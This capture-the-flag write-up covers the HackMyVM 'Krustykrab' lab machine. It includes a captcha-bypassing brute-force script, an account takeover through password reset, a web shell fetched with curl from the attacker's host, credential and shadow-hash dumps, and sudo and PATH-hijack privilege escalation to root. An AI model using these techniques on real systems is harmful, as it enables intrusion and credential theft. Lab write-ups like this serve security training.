# Krustykrab

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.52:22
Open 10.0.2.52:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.52

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 f6:91:6b:ad:ea:ad:1d:b9:44:09:d8:74:a3:02:38:35 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHfwrzEJyHgfZElFTwYGV9+QxxycRi96fjXC/e3rmV351bon/TOFgc1ULXnvmko82NyV7XIoHnBCXTqTPHDLWCY=
|   256 b6:66:2f:f0:4c:26:7f:7d:14:ea:b3:62:09:64:a7:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEU5q79Pr0UOvQI4zbO2+PMfFzd9tFJ8MuOApsO2MYmv
80/tcp open  http    syn-ack Apache httpd 2.4.62 ((Debian))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.62 (Debian)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/krustykrab/writeup.png)

```bash
└─$ curl -s http://krustykrab.hmv/ | grep '<!--'
  <!--
<!--      <div class="table_of_contents floating_element">
                <!--/var/www/html/finexo -->
```

Potential usernames: `SpongeBob, PatrickStar, Squidward, Sandy`

![writeup-1.png](/assets/pentest/hackmyvm/krustykrab/writeup-1.png)

### Fuzzing

```bash
└─$ feroxbuster -u http://krustykrab.hmv/finexo -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php,.html,.txt -S 279
301      GET        9l       28w      317c http://krustykrab.hmv/finexo => http://krustykrab.hmv/finexo/
200      GET      777l     1984w    27452c http://krustykrab.hmv/finexo/index.html
200      GET      264l      666w     8932c http://krustykrab.hmv/finexo/about.html
200      GET       46l       97w     1008c http://krustykrab.hmv/finexo/js/custom.js
200      GET      366l      787w    12244c http://krustykrab.hmv/finexo/team.html
200      GET     4442l    10999w   136801c http://krustykrab.hmv/finexo/js/bootstrap.js
200      GET        2l     1276w    88145c http://krustykrab.hmv/finexo/js/jquery-3.4.1.min.js
301      GET        9l       28w      324c http://krustykrab.hmv/finexo/assets => http://krustykrab.hmv/finexo/assets/
200      GET      155l      296w     4287c http://krustykrab.hmv/finexo/login.php
200      GET      298l      799w    10553c http://krustykrab.hmv/finexo/why.html
200      GET      308l      713w     9992c http://krustykrab.hmv/finexo/service.html
200      GET        0l        0w        0c http://krustykrab.hmv/finexo/config.php
301      GET        9l       28w      327c http://krustykrab.hmv/finexo/dashboard => http://krustykrab.hmv/finexo/dashboard/
301      GET        9l       28w      323c http://krustykrab.hmv/finexo/fonts => http://krustykrab.hmv/finexo/fonts/
301      GET        9l       28w      324c http://krustykrab.hmv/finexo/images => http://krustykrab.hmv/finexo/images/
301      GET        9l       28w      320c http://krustykrab.hmv/finexo/js => http://krustykrab.hmv/finexo/js/
200      GET        7l       58w    28265c http://krustykrab.hmv/finexo/particles.js-master/dist/particles.min.js
302      GET        0l        0w        0c http://krustykrab.hmv/finexo/logout.php => login.php
```

There's few public files in `http://krustykrab.hmv/finexo/assets/json`, especially [http://krustykrab.hmv/finexo/assets/json/file-upload.php](http://krustykrab.hmv/finexo/assets/json/file-upload.php). There's also [http://krustykrab.hmv/finexo/uploads/](http://krustykrab.hmv/finexo/uploads/)

Nothing from fuzzing, we might have to brute-force login page.
```bash
└─$ ffuf -u 'http://krustykrab.hmv/finexo/assets/json/file-upload.php' -d 'FUZZ=1' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fs 1
```

Login requires captcha, but it's generated by Javascript (?)

![writeup-2.png](/assets/pentest/hackmyvm/krustykrab/writeup-2.png)

### Brute-force

Using action PHP just returns the captcha value in text
```bash
└─$ curl 'http://krustykrab.hmv/finexo/login.php?action=generateCaptcha'
6bO5 
```

```python
import sys
from requests import Session

URL = 'http://krustykrab.hmv/finexo/login.php'

def login(session, username, password, attempt):
    captcha = session.get(URL, params={'action': 'generateCaptcha'}).text.strip()
    print(f'\r[{attempt:<5}] Captcha: {captcha}, Password: {password}', end='', flush=True)
    resp = session.post(URL, allow_redirects=False, data={
        'username': username,
        'password': password,
        'captcha': captcha
    })
    return resp

if len(sys.argv) != 3:
    print(f'Usage: {sys.argv[0]} <username> <wordlist.txt>')
    sys.exit(1)

username, wordlist = sys.argv[1].strip(), sys.argv[2]

with open(wordlist, 'r') as f, Session() as session:
    resp = login(session, username, 'password', 0)
    if "User doesn't exit" in resp.text:
        print(f'\n[!] User {username} does not exist')
        exit(2)
    
    for i, line in enumerate(f, 1):
        password = line.strip()
        resp = login(session, username, password, i)
        if 'Wrong captcha' in resp.text:
            print('\n[!] Encountered wrong captcha, exiting.')
            exit(3)
        
        if resp.status_code == 302:
            print(f'\n[+] Password found: {password}')
            exit(0)
```

```bash
└─$ py ./brute.py SpongeBob $rockyou
[*] Trying password: squarepants; Captcha: Jfz0
[+] Password found: squarepants
```

### File Upload

Once logged in what we ideally want is Webshell. Under profile `Edit Profile` allows uplaods.

![writeup-3.png](/assets/pentest/hackmyvm/krustykrab/writeup-3.png)

Successfully uploaded example file

![writeup-4.png](/assets/pentest/hackmyvm/krustykrab/writeup-4.png)

Uploaded files are in format: `{EPOCH_NOW}_upload.jpg`, any extension you upload gets uploaded as `jpg`

### IDOR

When we edit profile we can also reset password and specify username, meaning we should be able to reset password to any users.

`Administratro` user seems like a admin account

![writeup-5.png](/assets/pentest/hackmyvm/krustykrab/writeup-5.png)

We are redirected to `admin_dashboard` which contains Command Prompt

![writeup-6.png](/assets/pentest/hackmyvm/krustykrab/writeup-6.png)

## Web Shell

I just uploaded p0wny webshell using `curl 10.0.2.15/shell -O` -> [http://krustykrab.hmv/finexo/admin_dashborad/shell.php](http://krustykrab.hmv/finexo/admin_dashborad/shell.php)

```bash
www-data@KrustyKrab:…/finexo/admin_dashborad# cat ../config.php
<?php

session_start();

$servername = "localhost";
$username = "root";
$password = "RootRootandRootyou";
$dbname = "your_database";
$port = 3306;

$conn = new mysqli($servername, $username, $password, $dbname, $port);

if ($conn->connect_error) {
    die("æ°æ®åºè¿æ¥å¤±è´¥: " . $conn->connect_error);
}

return $conn;
```

```bash
www-data@KrustyKrab:…/finexo/admin_dashborad# mysql -u'root' -p'RootRootandRootyou' -e 'SHOW DATABASES;'
Database
information_schema
mysql
performance_schema
sys
your_database

www-data@KrustyKrab:…/finexo/admin_dashborad# mysql -u'root' -p'RootRootandRootyou' your_database -e 'SHOW TABLES;'
Tables_in_your_database
users

www-data@KrustyKrab:…/finexo/admin_dashborad# mysql -u'root' -p'RootRootandRootyou' your_database -e 'SELECT * FROM users;'
id	username	email	profile_picture	password	created_at	updated_at
1	SpongeBob		1757515104_upload.jpg	squarepants	2025-03-24 16:06:33	2025-09-10 10:03:30
2	Administratro		NULL	squarepants	2025-03-24 16:31:10	2025-09-10 10:05:35
```

## SSH (Lateral Movement)

```bash
www-data@KrustyKrab:…/html/finexo# sudo -l
Matching Defaults entries for www-data on KrustyKrab:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on KrustyKrab:
    (KrustyKrab) NOPASSWD: /usr/bin/split
```

[https://gtfobins.github.io/gtfobins/split/#sudo](https://gtfobins.github.io/gtfobins/split/#sudo)

```bash
www-data@KrustyKrab:…/html/finexo# echo | sudo -u KrustyKrab split --filter=id /dev/stdin
split: cannot open '/dev/stdin' for reading: Permission denied

www-data@KrustyKrab:…/html/finexo# echo test > /tmp/x
www-data@KrustyKrab:…/html/finexo# chmod 777 /tmp/x
www-data@KrustyKrab:…/html/finexo# echo | sudo -u KrustyKrab split --filter=id /tmp/x
uid=1000(KrustyKrab) gid=1000(debian) groups=1000(debian),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth),1002(krustygroup)
---
└─$ ssh-keygen -f id_rsa -q -P x
└─$ cat id_rsa.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINo5yk4bBfA0yglmKK6g9+sR/15xZpYOa0CMdN7dmI+p woyag@kraken
---
www-data@KrustyKrab:…/html/finexo# echo | sudo -u KrustyKrab split --filter='mkdir ~/.ssh' /tmp/x
www-data@KrustyKrab:…/html/finexo# echo | sudo -u KrustyKrab split --filter='echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINo5yk4bBfA0yglmKK6g9+sR/15xZpYOa0CMdN7dmI+p woyag@kraken" > ~/.ssh/authorized_keys' /tmp/x
```

```bash
└─$ ssh -i id_rsa KrustyKrab@krustykrab.hmv
KrustyKrab@KrustyKrab:~$ id
uid=1000(KrustyKrab) gid=1000(debian) groups=1000(debian),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth),1002(krustygroup)
```

### User.txt

```
KrustyKrab@KrustyKrab:~$ cat user.txt
dcc8b0c111c9fa1522c7abfac8d1864b
```

## Privilege Escalation (spongebob)

```bash
KrustyKrab@KrustyKrab:~$ sudo -l
Matching Defaults entries for KrustyKrab on KrustyKrab:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User KrustyKrab may run the following commands on KrustyKrab:
    (spongebob) NOPASSWD: /usr/bin/ttteeesssttt

	KrustyKrab@KrustyKrab:~$ file /usr/bin/ttteeesssttt
/usr/bin/ttteeesssttt: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d09b4f447605d9003bb1b561944e39b22f1cd650, for GNU/Linux 3.2.0, not stripped
```

The program takes original burger items, shuffles it and asks you to unshuffle.

![writeup-7.png](/assets/pentest/hackmyvm/krustykrab/writeup-7.png)

With strings we can find the items, they should be in order because sorting is not in code.
```bash
KrustyKrab@KrustyKrab:~$ strings /usr/bin/ttteeesssttt
...
Bottom bun
Patty
Lettuce
Cheese
Onion
Tomato
Ketchup
Mustard
Pickles
Top bun
ABCDEFGHIJ
...
```

Get question
```bash
KrustyKrab@KrustyKrab:~$ sudo -u spongebob /usr/bin/ttteeesssttt
...
```

Solve question
```python
canonical = [
    'Bottom bun',
    'Patty',
    'Lettuce',
    'Cheese',
    'Onion',
    'Tomato',
    'Ketchup',
    'Mustard',
    'Pickles',
    'Top bun',
]

recipe = '''
A: Patty
B: Top bun
C: Lettuce
D: Bottom bun
E: Tomato
F: Onion
G: Ketchup
H: Mustard
I: Pickles
J: Cheese
'''.strip()

# parse letter -> item
item_to_letter = {}
for line in recipe.splitlines():
    letter, item = map(str.strip, line.split(':', 1))
    item_to_letter[item] = letter

answer = ''.join(item_to_letter[item] for item in canonical)
print(answer)
```

Submit and get shell
```bash
Please enter the correct order using letters (e.g., ABCDEFGHIJ):
Enter 10 letters (A-J): DACJFEGHIB

Validation successful! Perfect Krabby Patty!
spongebob@KrustyKrab:/home/KrustyKrab$ id
uid=1001(spongebob) gid=1001(spongebob) groups=1001(spongebob),100(users),1002(krustygroup)
```

Upgrade to SSH
```bash
spongebob@KrustyKrab:~$ mkdir ~/.ssh
spongebob@KrustyKrab:~$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINo5yk4bBfA0yglmKK6g9+sR/15xZpYOa0CMdN7dmI+p woyag@kraken" > ~/.ssh/authorized_keys
```

## Privilege Escalation (Squidward)

```bash
spongebob@KrustyKrab:~$ find . -type f -ls
 13369354      4 -rw-------   1 spongebob spongebob      113 Mar 27 05:16 ./.mysql_history
 13369353      4 -rw-r--r--   1 root      root            97 Mar 27 02:41 ./note.txt
 13369358      4 -rw-r--r--   1 spongebob spongebob       94 Sep 10 11:28 ./.ssh/authorized_keys
 13369347      4 -rw-r--r--   1 spongebob spongebob     3553 Mar 30 00:09 ./.bashrc
 13369346      4 -rw-r--r--   1 spongebob spongebob      220 Mar 26 20:14 ./.bash_logout
 13369348      4 -rw-r--r--   1 spongebob spongebob      807 Mar 26 20:14 ./.profile
 13369351     20 -rw-r--r--   1 root      root         19259 Mar 27 02:32 ./key2.jpeg
 13369350      4 -rw-r--r--   1 root      root            33 Mar 27 02:37 ./key1
spongebob@KrustyKrab:~$ cat key1
e1964798cfe86e914af895f8d0291812
spongebob@KrustyKrab:~$ file key2.jpeg
key2.jpeg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 640x426, components 3
```

Nothing with `strings` or `exiftool`, definitely not steganography.
```bash
└─$ scp -i id_rsa spongebob@krustykrab.hmv:key2.jpeg .
```

Key1 does look like an md5 hash, maybe Key2 is md5sum of image?
```bash
spongebob@KrustyKrab:~$ md5sum key2.jpeg
5e1d0c1a168dc2d70004c2b00ba314ae  key2.jpeg

spongebob@KrustyKrab:~$ echo -n 'e1964798cfe86e914af895f8d02918125e1d0c1a168dc2d70004c2b00ba314ae' | md5sum
7ac254848d6e4556b73398dde2e4ef82  -

spongebob@KrustyKrab:~$ su - Squidward
Password: 7ac254848d6e4556b73398dde2e4ef82
$ id
uid=1002(Squidward) gid=1003(Squidward) groups=1003(Squidward)
```

## Privilege Escalation (root)

```bash
└─$ sshpass -p '7ac254848d6e4556b73398dde2e4ef82' ssh Squidward@krustykrab.hmv
$ /bin/bash
Squidward@KrustyKrab:~$ ls -alh
total 40K
drwx------ 3 Squidward Squidward 4.0K Mar 30 00:19 .
drwxr-xr-x 6 root      root      4.0K Mar 27 02:30 ..
lrwxrwxrwx 1 Squidward Squidward    9 Mar 30 00:19 .bash_history -> /dev/null
-rw-r--r-- 1 Squidward Squidward  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 Squidward Squidward 3.5K Apr 23  2023 .bashrc
-rwsr-xr-x 1 root      root       16K Mar 27 05:12 laststep
drwxr-xr-x 3 Squidward Squidward 4.0K Mar 27 08:17 .local
-rw-r--r-- 1 Squidward Squidward  807 Apr 23  2023 .profile
```

SUID binary just reads `/etc/shadow`, however the path is relative not absolute.
```bash
Squidward@KrustyKrab:~$ ./laststep  | grep '\$'
root:$y$j9T$xm9zjJdLydmP9yMp9Nj3C0$RK1zpq.FysZjb30c5IUWzUi.BWYvIUsygxhgsyvyzO3:20174:0:99999:7:::
KrustyKrab:$y$j9T$v3iavPLpYl5ezsR4pMSjc0$bPxk2s3wxGrhgv4PpFbYVP9sy4ERDnAzf14Ud.p1Iq4:20174:0:99999:7:::
spongebob:$y$j9T$QMeIdDraDWE0L5C65y6SN1$JqifleH2vWxsHdW.1eZHTLEhqluSDP7RKOPhKdpGip8:20174:0:99999:7:::
Squidward:$y$j9T$G4aYhd9T1rT4dzeu06RZZ1$mbjej1b0wgbrF.KlZrP6WafH5tI9ssL8ztqEDDC2tD7:20174:0:99999:7:::

Squidward@KrustyKrab:~$ strings ./laststep | grep shadow
cat /etc/shadow
```

```bash
Squidward@KrustyKrab:~$ echo $'#!/bin/bash\ninstall -m4777 /bin/bash /tmp/rootbash' > /tmp/cat
Squidward@KrustyKrab:~$ chmod 777 /tmp/cat
Squidward@KrustyKrab:~$ PATH=/tmp:$PATH ./laststep
Squidward@KrustyKrab:~$ /tmp/rootbash -p
rootbash-5.2# id
uid=1002(Squidward) gid=1003(Squidward) euid=0(root) groups=1003(Squidward)
```

### Root.txt

```bash
rootbash-5.2# cat /root/root.txt
efe397e3897f0c19ef0150c2b69046a3
```